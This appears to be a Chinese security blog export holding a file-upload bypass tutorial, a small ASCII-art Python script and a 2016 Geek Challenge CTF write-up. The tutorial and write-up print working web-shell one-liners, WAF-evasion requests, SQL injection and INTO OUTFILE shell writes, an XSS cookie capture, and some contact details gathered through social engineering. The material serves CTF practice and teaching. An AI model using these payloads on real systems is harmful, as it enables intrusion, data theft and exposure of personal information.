$uploadfile)) &#123; echo "File is valid, and was successfully uploaded.\n"; &#125; else &#123; echo "File uploading failed.\n"; &#125; ?&gt; 可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。 文件头校验可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系： .JPEG;.JPE;.JPG，”JPGGraphic File” .gif，”GIF 89A” .zip，”Zip Compressed” .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” 文件上传绕过校验姿势 客户端绕过（抓包改包） 服务端绕过 文件类型 文件头 文件后缀名 配合文件包含漏洞绕过 配合服务器解析漏洞绕过 CMS、编辑器漏洞绕过 配合操作系统文件命名规则绕过 配合其他规则绕过-WAF绕过 客户端绕过可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。 服务端绕过文件类型绕过我们可以通过抓包，将content-type字段改为image/gif123456789101112POST /upload.php HTTP/1.1TE: deflate,gzip;q=0.3Connection: TE, closeHost: localhostUser-Agent: libwww-perl/5.803Content-Type: multipart/form-data; boundary=xYzZYContent-Length: 155--xYzZYContent-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;shell.php&quot;Content-Type: image/gif (原为 Content-Type: text/plain)&lt;?php system($_GET[&apos;command&apos;]);?&gt;--xYzZY- 文件头绕过在木马内容基础上再加了一些文件信息，有点像下面的结构GIF89a&lt;?php phpinfo(); ?&gt; 文件后缀名绕过前提：黑名单校验黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。绕过方法： 找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类 可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类能被解析的文件扩展名列表： jsp jspx jspf asp asa cer aspx exe exee php php php3 php4 配合文件包含漏洞前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：12345678#PHP &lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; #ASP &lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;#JSP &lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;or &lt;%@include file=&quot;上传的txt文件路径&quot;%&gt; 配合服务器解析漏洞详细可参考：http://thief.one/2016/09/21/服务器解析漏洞/ 配合操作系统文件命令规则 上传不符合windows文件命名规则的文件名 test.asp. test.asp(空格) test.php:1.jpg test.php::$DATA shell.php::$DATA…….会被windows系统自动去掉不符合规则符号后面的内容。 linux下后缀名大小写在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。CMS、编辑器漏洞（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。这两方面的漏洞以后单独成文汇总，这里点到为止配合其他规则（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候 test.php(0x00).jpg test.php%00.jpg 路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg伪代码演示：12345name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)type =gettype(name) //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpgif(type == jpg) SaveFileToPath(UploadPath.name, name) //但在这里却是以 0x00 作为文件名截断//最后以 help.asp 存入路径里 WAF绕过垃圾数据有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。 filename针对早期版本安全狗，可以多加一个filename或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方： POST/GET有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET。 以上方式针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。————————————————2017.2.6更新————————————————– 利用waf本身缺陷删除实体里面的Conten-Type字段第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。123正常包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png构造包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.pngC.php&quot; 删除Content-Disposition字段里的空格增加一个空格导致安全狗被绕过案列：Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099尝试在boundary后面加个空格或者其他可被正常处理的字符：boundary= —————————47146314211411730218525550 修改Content-Disposition字段值的大小写 Boundary边界不一致每次文件上传时的Boundary边界都是一致的：1234567Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099Content-Length: 253-----------------------------4714631421141173021852555099Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;Content-Type: application/octet-stream&lt;%eval request(&quot;a&quot;)%&gt;-----------------------------4714631421141173021852555099-- 但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：Win2k3 + IIS6.0 + ASP 文件名处回车 多个Content-Disposition在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP 利用NTFS ADS特性ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。 文件重命名绕过如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。 特殊的长文件名绕过文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg 反删除将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞） 文件校验的几点建议 文件扩展名服务端白名单校验。 文件内容服务端校验。 上传文件重命名。 隐藏上传文件路径。 以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。参考文章：https://xianzhi.aliyun.com/forum/read/458.html?fpage=2还有一篇tools上大牛的文章，url暂时找不到了……]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-图片转字符画]]></title>
    <url>%2F2016%2F10%2F%E5%9B%BE%E7%89%87%E8%BD%AC%E5%AD%97%E7%AC%A6%E7%94%BB%2F</url>
    <content type="text"><![CDATA[这个是从某个学习站点弄下来的，具体忘了是哪个了 。=.=1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8from PIL import Imageimport argparse#命令行输入参数处理parser = argparse.ArgumentParser()#add_argument:读入命令行参数，该调用有多个参数parser.add_argument('file') #输入文件parser.add_argument('-o', '--output') #输出文件parser.add_argument('--width', type = int, default = 80) #输出字符画宽parser.add_argument('--height', type = int, default = 45) #输出字符画高#获取参数args = parser.parse_args()IMG = args.fileWIDTH = args.widthHEIGHT = args.heightOUTPUT = args.output'''一张图片从图像到字符不是一蹴而就的，需要经过很多步骤，光看着可能没什么头绪，先从成品上着手，成品是一系列字符的组合，我们可以把字符看作是比较大块的像素，一个字符能表现一种颜色（暂且这么理解吧），字符的种类越多，可以表现的颜色也越多，图片也会更有层次感，下面是我们选择的字符集。'''ascii_char = list("$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\"^`'. ")'''没有自己用手去数吧？告诉你，一共有 70 个字符，当然也不是字符越多越好，具体还得看选择的图片，自己反复尝试效果。问题来了，我们是要转换一张彩色的图片，这么这么多的颜色，要怎么对应到字符上去？这里就要介绍灰度值的概念了。 灰度值：指黑白图像中点的颜色深度，范围一般从0到255，白色为255，黑色为0，故黑白图片也称灰度图像这样就好办了，灰度值大的用列表开头的符号，灰度值小的用列表末尾的符号。灰度值公式:灰度值 ＝ 0.2126 * r + 0.7152 * g + 0.0722 * b'''# 将256灰度映射到70个字符上,RGB值转字符的函数def get_char(r,b,g,alpha = 256): if alpha == 0: return ' ' length = len(ascii_char) gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b) unit = (256.0 + 1)/length return ascii_char[int(gray/unit)]if __name__ == '__main__': im = Image.open(IMG) im = im.resize((WIDTH,HEIGHT), Image.NEAREST) txt = "" for i in range(HEIGHT): for j in range(WIDTH): txt += get_char(*im.getpixel((j,i))) txt += '\n' print txt #字符画输出到文件 if OUTPUT: with open(OUTPUT,'w') as f: f.write(txt) else: with open("output.txt",'w') as f: f.write(txt)]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第七届极客大挑战]]></title>
    <url>%2F2016%2F10%2F%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%2F</url>
    <content type="text"><![CDATA[12345678910111213RcoIl@kali:~$ lsteamInfo baseInfoRcoIl@kali:~$ cat teamInfo战队名称:RcoIl战队hash:7cfe3df08ca8d03c8767f0e5c88a636f成员：RcoIlRcoIl@kali:~$ cat baseInfo基本信息:姓名:个人分数:3970学号:学院:手机号码: Webweb_1(score:50)来搞web了，先瞅瞅基础姿势 http://web.sycsec.com/a59817b3061870c0/ 解法：打开网址发现是一张图片，图片上说明flag在别的地方，使用burpsuite进行抓包，在Response中即可看到flagflag：SYC{This_1s_Http_he4der} web_2(score:50)来搞web了，先瞅瞅基础姿势 http://web.sycsec.com/ce9b3a20d290fbc8/ 解法：打开网址，看到的是123Hello guest@geekgameWelcome to GeekGame2016@SycloverYou are not admin,I am sorry you can&apos;t see the flag 所以是要admin用户登录，但是有没有登录框，所以就cookie方面。用Firefox将cookie中的Cookie: whoami=guest%40geekgame; root=o;改成Cookie: whoami=admin%40geekgame; root=1;，刷新页面flag：SYC{Welc0me_b4ck_4dm1n} Social Engineering(score:200)有一天我捕了一只狗师傅，嘴里叼着一张纸，纸上赫然写着：http://web.sycsec.com/36da077bd47665ae/ (解题不需要联系题目邮箱和电话号码，请不要试图联系题目的邮箱和电话号码) 解法：看到题目，社会工程学。fun678@126.com13904011607我是一个有贴吧的男人！到70sec社工库查询两个信息，都看到肖力这个名字，然后到贴吧里面搜这个肖力吧—看了帖子的日期，有个是近期的，而且还有个扣扣贴出来3077791373，加了这个扣扣为好友，看了信息确实是和比赛有关的，看了资料没见什么有用的信息，翻空间，最后在留言板哪里看到了这样一句话：听说域名的注册人联系号码就是flag诶！！！但是不知道是哪个域名，那就查吧。查了主页的，发现注册人是叫胡浪宇邮箱：casperkid.syclover@gmail.com。然后没有什么信息了。google了一波123456NameSyclover AriesPhone number+86.13412341234AddressCUIT Syclover ChengDu SiChuan 610000 CN flag：SYC{13412341234} sqli1(score:100)呃，听说这个和数据库有关呢-，- http://web.sycsec.com/d03e52c272e42e7c/ 解法：看题目，是注入。看源代码，发现Tip:sycidURL：http://web.sycsec.com/d03e52c272e42e7c/?sycid=123456789101112http://web.sycsec.com/d03e52c272e42e7c/?sycid=1Good Luck！Tip:sycidselect * from syc where sycid=11-&gt;pwnpwnpwn!-&gt;0xmuhehttp://web.sycsec.com/d03e52c272e42e7c/?sycid=2Good Luck！Tip:sycidselect * from syc where sycid=22-&gt;mushifuzuishuai-&gt;Lemonhttp://web.sycsec.com/d03e52c272e42e7c/?sycid=3Good Luck！Tip:sycidselect * from syc where sycid=33-&gt;wozuishuai-&gt;[+.+] 然而，这些信息好像在手工上没什么用处，试试用sqlmap跑12345678910111213141516171819202122232425sqlmap resumed the following injection point(s) from stored session:---Parameter: sycid (GET) Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: sycid=1 AND SLEEP(5) Type: UNION query Title: Generic UNION query (NULL) - 3 columns Payload: sycid=-2990 UNION ALL SELECT NULL,NULL,CONCAT(0x716a626271,0x6d61616c7255756242696b476258515864586674567a6e66794d707771564e6b526f73704a70416b,0x7178716271)-- oPDy---[21:52:02] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.3back-end DBMS: MySQL &gt;= 5.0.12------------------------------------------------------------------------------------Database: sycsqli1Table: #FL4G#[1 entry]+--------------------------+| flag |+--------------------------+| SYC&#123;Sqli_1s_Not_So_Hard&#125; |+--------------------------+ sqli2(score:150)我是萌萌哒sqli2：http://web.sycsec.com/a2274e0e500459f7/ 解法：一个登陆框，应该是post注入。试了试，是在username和password存在，1payload：&apos;%2b(select*from(select(sleep(20)))a)%2b&apos; 这种还是老老实实的抓包丢到sqlmap里面跑吧。但是解不出来，应该是有限制的，抓包修改了debug的值，出现：12Tip: Only 1 row returned can you get flag.只有一行返回才能拿到flag 这时候想起来，post注入不是还有另一种，不用抓包的1234567891011121314151617181920212223sqlmap -u &quot;http://web.sycsec.com/a2274e0e500459f7/login.php&quot; --data &quot;username=a&amp;password=a&amp;debug=1&quot; sqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST) Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: username=a&apos; AND (SELECT 7336 FROM(SELECT COUNT(*),CONCAT(0x7171717071,(SELECT (ELT(7336=7336,1))),0x7176767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &apos;ZrQZ&apos;=&apos;ZrQZ&amp;password=a&amp;debug=1---[12:02:44] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL &gt;= 5.0---------------------------------------------------------------------------------------------Database: sycsqli2Table: users[2 entries]+----------+----------+| username | password |+----------+----------+| admin | 23333 || guest | welcome |+----------+----------+ Congrats, Flag is: SYC&#123;G00d_K33p_Trying_Wish_U_Success&#125; 另一种方法：(修改post提交，简单说就是万能密码)payload：’ union select 1,1# 或 admin’ or ‘1’=’1 127.0.0.x(score:200)落雨声滴答滴滴,回荡着轻声细语:http://game.sycsec.com:50080/69e57206e1bc2a23/ 解法：查看源代码发现一串base64加密：123aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS5oay93ZWJocD9obD16aC1DTiZzb3VyY2VpZD1jbmhwJmd3c19yZD1zc2wjbmV3d2luZG93PTEmc2FmZT1zdHJpY3QmaGw9emgtQ04mcT0xMjcuMC4wLjI=解密得到https://www.google.com.hk/webhp?hl=zh-CN&amp;sourceid=cnhp&amp;gws_rd=ssl#newwindow=1&amp;safe=strict&amp;hl=zh-CN&amp;q=127.0.0.2 是查询127.0.0.2，但是127.0.0.1–255的结果不都一样的吗，然后就伪造IP个个尝试访问，发现每个返回滴滴的个数都不一样，所以写个脚本遍历1–255这个段，引用一航同学的代码12345678910111213141516171819202122# coding:utf8import requestsurl = &quot;http://game.sycsec.com:50080/69e57206e1bc2a23/&quot;headers = &#123; &apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;, &apos;Accept-Encoding&apos;:&apos;gzip, deflate, sdch&apos;, &apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8&apos;, &apos;Cache-Control&apos;:&apos;no-cache&apos;, &apos;Connection&apos;:&apos;keep-alive&apos;, &apos;Cookie&apos;:&apos;__cfduid=dd80d162f768e8bc3d8564f32286b69301476092200&apos;, &apos;Host&apos;:&apos;game.sycsec.com:50080&apos;, &apos;Pragma&apos;:&apos;no-cache&apos;, &apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; WOW64) Chrome/53.0.2785.116 Safari/537.36&apos;, &apos;X-Forwarded-For&apos;:&apos;&apos; &#125;s = requests.Session()for i in range(0,256): ip = &quot;127.0.0.&quot; + str(i) headers[&apos;X-Forwarded-For&apos;] = ip response = s.get(url, headers=headers) print ip + &quot;\t&quot; + response.text 跑完之后我们对打印出的数据进行分析 :首先去掉每次请求返回的重复数据然后通览全文 , 直接发现没有被去掉的就是flag.当然，也可以这样12345678import requestsurl = &apos;http://game.sycsec.com:50080/69e57206e1bc2a23/&apos;for i in xrange(1,256): h = &#123;&apos;X-Forwarded-For&apos;:&apos;127.0.0.&apos;+str(i)&#125; rep = requests.get(url,headers=h) if &apos;SYC&apos; in rep.content: print rep.content break flag：SYC{Shan_Dong_Ren_Xiong_Qi} php_is_fun(score:200)phpinfo() is disabled; http://game.sycsec.com:50084/12345678910111213141516171819&lt;?phpif(isset($_GET) &amp;&amp; !empty($_GET))&#123; $url = $_GET[&apos;file&apos;]; $path = &quot;upload/&quot;.$_GET[&apos;path&apos;];&#125;else&#123; show_source(__FILE__); exit();&#125; if(strpos($path,&apos;..&apos;) &gt; -1)&#123; die(&apos;SYCwaf!&apos;);&#125; if(strpos($url,&apos;http://127.0.0.1/&apos;) === 0)&#123; file_put_contents($path, file_get_contents($url)); echo &quot;console.log($path update successed!)&quot;;&#125;else&#123; echo &quot;Hello.Geeker&quot;;&#125; 解法：在服务器端访问以http://127.0.0.1/开头的一个页面 ,将页面的内容保存到服务器的web目录下的upload文件夹下，总的来说大概就是上传获取。(过程的payload显示得莫名其妙，就删掉了)最后看了一航同学的payload，发现是编码问题。1http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%3Ffile%3Dindex.php%26path%3D%3C?php%2520eval($_POST[%27admin%27]);?%3E&amp;path=rcoil.php 最后连一句话读upload下的内容flag：SYC{3992a1e498d69161}饶了个弯将一句话才写进去 撸啊撸(score:300)喜欢玩LOL么 http://lol.sycsec.com 解法：貌似也是有注入的，在Referer，但是前面已经两道注入，但是又发现有个download.php,尝试下download.php可以下载源码，然后下载display.php,在里面发现config.inc.php，下载下来，1234567&lt;?php return array( &apos;db_host&apos; =&gt; &apos;localhost&apos;, &apos;db_user&apos; =&gt; &apos;syclol&apos;, &apos;db_pwd&apos; =&gt; &apos;fJBGpEfu3wWLvNHB&apos;, &apos;database&apos; =&gt; &apos;syclol&apos; ); 数据库的链接所需数据。在api.php中发现执行Sql查询的语句12$sql = &quot;SELECT * FROM images LIMIT $img_first,$img_num&quot;;$result = mysqli_query($conn,$sql); 既然是程序和用户交互的地方，因为这种地方在参数传递的时候没有对参数的类型和正确性进行判断，那就会留给我们利用的余地。我们再看看这个：12345$check = is_numeric($img_num) and is_numeric($img_first); if (!$check)&#123; $img_num = intval($img_num); $img_first = intval($img_first); 根据运算优先级知道，$check 这个变量的值就只取决于 $img_num.所以只要满足$img_num，就相当于$check也满足了。而剩下的$img_first就可以用来构造我们所需要的语句了。构造：1234567891011121314http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select 1,2--+ http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select database(),version()--+结果：&#123;&quot;result&quot;:[&#123;&quot;id&quot;:&quot;syclol&quot;,&quot;path&quot;:&quot;5.1.71&quot;&#125;]&#125;----&gt;mysql 5.0版本以后提供了information.schema表，表中记录了数据库中所有的库、表、列等信息 http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select 1,group_concat(schema_name) from information_schema.schemata--+爆出所有的库名：&#123;&quot;result&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;path&quot;:&quot;information_schema,syclol&quot;&#125;]&#125; http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=&apos;syclol&apos;--+爆出所有表名：&#123;&quot;result&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;path&quot;:&quot;images&quot;&#125;]&#125; http://lol.sycsec.com/api.php?img_num=0&amp;img_first=0 union select 1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&apos;images&apos;--+爆出所有字段：&#123;&quot;result&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;path&quot;:&quot;id,path&quot;&#125;]&#125; 之前看了代码知道id,path这两个是显示图片的参数。到了这里就卡住了，这时候一航同学又一次的站了出来(找一个有写权限的目录)。既然可以用联合查询语句，mysql就用into outfile那就尝试下写个shell,因为是linux系统,测试默认地址。1http://lol.sycsec.com/api.php?img_num=2&amp;img_first=0 union select 1,&quot;&lt;?php echo phpinfo();?&gt;&quot; into outfile &quot;/var/www/html/test.txt&quot;--+ 根目录写入不成功。在浏览网站的时候，我们知道有个images目录，那就尝试这个目录1http://lol.sycsec.com/api.php?img_num=2&amp;img_first=0 union select 1,&quot;&lt;?php echo phpinfo();?&gt;&quot; into outfile &quot;/var/www/html/images/test.txt&quot;--+ 能访问成功。写一句话。在根目录下找到Flag123asdzpoiwqsd.php，下载一波1http://lol.sycsec.com/download.php?url=Flag123asdzpoiwqsd.php 皓宝宝的留言板(score:150)http://web.sycsec.com/42e1f42bcf3c0cfc/ 听说有很多妹子在这里写下她们对皓宝宝的爱慕之情 学习资料：https://github.com/l3m0n/XSS-Filter-Evasion-Cheat-Sheet-CN 解法：看了题目，就知道是XSS了。我们就直接用给的资料里面的参数进行测试。直接用xss平台。偷了一波cookie12345Cookie: flag=SYC&#123;oo_y0u_kn0W_xss&#125;; CNZZDATA1252970113=1534700898-1476063225-|1476171869IP: 59.172.176.132Date and Time: 17 October, 2016, 5:07 pmReferer: http://web.sycsec.com/42e1f42bcf3c0cfc/xss_bcf3c0cfce5eaab9abc.phpMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36 flag：SYC{oo_y0u_kn0W_xss} 人生苦短(score:150)http://web.sycsec.com/40a9ddba689f8200/ 解法：打开网站，将方程32+64+py=10(次),py=?解出来提交py，得到Now You See Me，查看源码，发现狗师傅不想理你，并向你丢了一坨神秘代码看到等号，首先想到base64，但是发现都是大写，没有小写，考虑到是base32解出来发现是base64,再解发现是base32这样交替循环着123456import base64word = &apos;&apos;for dd in range(0,10): word2 = base64.b32decode(word1) word1 = base64.b64decode(word2)print(word1) flag;SYC{I_Love_You} 狗师傅的计算器(score:200)狗师傅说fuck my brain:)。http://game.sycsec.com:50085/ 解法：文件包含….打开页面，发现是1+++++ +++++ [ - &gt; ++ +++++ +++ &lt;]&gt; ++++ +++++ +++++ +++++ &lt;+++。 + [ - &gt; - - &lt;]&gt; - + +++++ + --- ----- - &lt;++ + [ - &gt; + ++ &lt;]&gt; +++ .- -.--- ----- &lt;+++ ++++ [ - &gt; --- ---- &lt;]&gt; --- &lt;+++++ +++ [ - &gt; ++++ ++++ &lt;]&gt; ++。----- --- + +++++ ++ &lt; 在看到robots.txt后，发现是brain fuck，下载个brainfuck.exe进行转码(将代码复制下来保存在brainfuck.exe同目录下，并命名为test.b)，结果是welcome.php。当然，也可以用Python来解析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import osimport sys def mainloop(program, bracket_map): pc = 0 tape = Tape() while pc &lt; len(program): code = program[pc] if code == &quot;&gt;&quot;: tape.advance() elif code == &quot;&lt;&quot;: tape.devance() elif code == &quot;+&quot;: tape.inc() elif code == &quot;-&quot;: tape.dec() elif code == &quot;.&quot;: # print os.write(1, chr(tape.get())) elif code == &quot;,&quot;: # read from stdin tape.set(ord(os.read(0, 1)[0])) elif code == &quot;[&quot; and tape.get() == 0: # Skip forward to the matching ] pc = bracket_map[pc] elif code == &quot;]&quot; and tape.get() != 0: # Skip back to the matching [ pc = bracket_map[pc] pc += 1 class Tape(object): def __init__(self): self.thetape = [0] self.position = 0 def get(self): return self.thetape[self.position] def set(self, val): self.thetape[self.position] = val def inc(self): self.thetape[self.position] += 1 def dec(self): self.thetape[self.position] -= 1 def advance(self): self.position += 1 if len(self.thetape) &lt;= self.position: self.thetape.append(0) def devance(self): self.position -= 1 def parse(program): parsed = [] bracket_map = &#123;&#125; leftstack = [] pc = 0 for char in program: if char in (&apos;[&apos;, &apos;]&apos;, &apos;&lt;&apos;, &apos;&gt;&apos;, &apos;+&apos;, &apos;-&apos;, &apos;,&apos;, &apos;.&apos;): parsed.append(char) if char == &apos;[&apos;: leftstack.append(pc) elif char == &apos;]&apos;: left = leftstack.pop() right = pc bracket_map[left] = right bracket_map[right] = left pc += 1 return &quot;&quot;.join(parsed), bracket_map def run(fp): program_contents = &quot;&quot; while True: read = os.read(fp, 4096) if len(read) == 0: break program_contents += read os.close(fp) program, bm = parse(program_contents) mainloop(program, bm) if __name__ == &apos;__main__&apos;:run(os.open(sys.argv[1], os.O_RDONLY, 0777)) 执行python brainfuck.py xxx.bf 在看robots.txt的时候发现有个包含1234$str=$_GET[&apos;syc&apos;]; //包含参数 if(strpos($str ,&apos;..&apos;) &gt; -1 || strops($str , &apos;=/&apos;) &gt; -1)&#123; //过滤参数 die(&apos;Do not hack master go :)&apos;); 觉得这道题是文件包含。看了robots.txt知道，在result.php里面有一个get请求，请求头是syc，有戏。1payload:http://game.sycsec.com:50085/result.php?syc=php://filter/convert.base64-encode/resource=syc 包含的其实是syc.php，只不过在末尾会默认添加php，所以写个syc就可以了。得到一串base加密密文，拿去解密即可；flag：SYC{php_iS_Fun} Only number never lies to you(score:250)http://game.sycsec.com:50082/ Only number never lies to you. Tip:dir 解法：进入界面之后Only number never lies to you 151029103521**，仔细看那一串数据，发现将5改为6,就是我现在访问的时间（只有数字不会说谎），题目提示dir—–&gt;列目录。那目录名应该就是由数字组成的。所以应该是—-&gt;访问时间+两位数字 上传(1)(score:100)http://game.sycsec.com:50081/ 解法：试了几个上传的后缀名，上传phtml成功出flag。flag：SYC{Ohno_y0u_f0und_me} 上传(2)(score:100)http://game.sycsec.com:50081/接上一个题目，还有ｆｌａｇ哦! 解法：上一道题上成功后，得到上传的地址。因为是上传了一句话，所以就直接用菜刀直接连，但是连接过去提示了所上传phtml中的内容，可能大概的过滤掉了某些参数。尝试了几个1&lt;script language=&quot;Php&quot;&gt;eval ($_POST[1]);&lt;/script&gt; 连接即可。flag:SYC{bRa1Nf4Ck} 思考：上传2的shell和php_is_fun的shell所在的服务器是一样的，但是为什么会有不一样的权限。为什么同一台服务器的shell权限不一样，然后就去问了客服小哥。小哥说只有一台服务器，但是题目是用docker搭建的。 你是人间四月天(score:150)岁月不堪数 故人不知处 最是人间留不住 http://game.sycsec.com:50080/9392d16bb9fbda00/ 解法：打开页面。发现两个选项都是no。qq%e6%88%aa%e5%9b%be20161025004524改成yes出现想到的是伪造，然后尝试了Referer：来源伪造—&gt;失败X-Forwarded-For：ip伪造—&gt;失败Host：指定访问的http服务器的域名/IP 地址和端口号—&gt;成功 出现flag：SYC{Where_can_i_find_yuo_girl} Misc签到题(score:10)SYC{We1c0m3_To_G33k_2O!6} xiao彩蛋(√已完成)听说关注微博关注后私信有彩蛋 解法：刚开始我是关注了：微博关注，果然是想太多，然后关注三叶草小组的微博之后私信发送flag就可以得到 闪的好快(score:150)http://down.sycsec.com/misc/masterGO.7z 这是二维码吗？嗯。。。是二维码了，我靠，闪的好快。。。 解法：是一个gif动态二维码图，用GIF Movie Gear将图片打开，以此扫描即可flag：SYC{F1aSh_so_f4sT} Come_game(score:50)听说游戏通关就有flag https://pan.baidu.com/s/1dE1zzWH 解法：.小基友硬玩过关得到flag,另一种解法：打开游戏，在目录下会生成一个save的文件。用Winhex01 32改成01 35，原理就是：第一关是32，过一关就+1,一共3关，所以改成35后重新进入游戏就可以通关了。flag：SYC{6E23F259D98DF153} ###snow(score:50)NO KEY NO FLAG http://down.sycsec.com/misc/snow.html 解法：源代码中key:syclover2016，抓包看看。但是发现一个奇怪的地方，就是用Firefox+burpsuite抓不到包，而用chrome+burpsuite是可以的。这时候看了官方给的提示，知道是隐写题，使用snow加密的解密命令：12snow -C -p &quot;key&quot; outfile----------&gt;SYC&#123;HaHaHa_You_Find_Me&#125; 这里最坑的就是，用转存的页面是解不出来的，要查看源代码，复制出来的页面才能解。 旋转跳跃(score:100)熟悉的声音中貌似又隐藏着啥，key：syclovergeek 链接: https://pan.baidu.com/s/1hsdncKs 密码: xu5b 解法：MP3的隐写题，看到是有key的。想到了MP3Stego。123MP3StegoDecode.exe -X -P syclovergeek sycgeek-mp3.mp3解开的txt里有flagSYC&#123;Mp3_B15b1uBiu_W0W&#125; 凯撒部长的奖励(√已完成)就在8月，超师傅出色地完成了上级的特遣任务，凯撒部长准备给超师傅一份特殊的奖励，兴高采烈的超师傅却只收到一长串莫名的密文，超师傅看到英语字串便满脸黑线，帮他拿到这份价值不菲的奖励吧。 密文：1MSW&#123;byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om&#125; 解法：丢去凯撒解密就可以了 MD5cracker(score:50)01540f319ff0cf88928c83de23l27fbb 狗师傅说flag是解出MD5后加上SYC{}哦！ 解法：因为仔细一看，发现了l，就改成了1，就直接解出来了flag：SYC{clay} 